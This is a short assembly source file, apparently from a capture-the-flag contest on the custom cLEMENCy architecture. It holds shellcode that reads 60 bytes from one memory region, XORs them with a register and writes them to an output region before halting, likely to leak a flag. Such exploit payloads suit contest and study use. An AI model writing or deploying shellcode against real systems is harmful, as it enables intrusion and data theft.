// cLEMENCy XOR shellcode
#define MOVI(r,imm) ml r, {(imm) & 0x3ff} ;\
    mh r, {(imm) >> 10}
_start:
    MOVI(R9, 0x4010000)
    adi R10, R9, 60
    MOVI(R0, 0x5010000)
repeat:
    ldti R3, [R9+0,1]
    xr R3, R3, ST
    stti R3, [R0+0,1]
    cm R9, R10
    bn $repeat

ml R2, 60
ml R4, {0x2000 - 60}
ad R0, R0, R4
stt R2, [R0]
ht
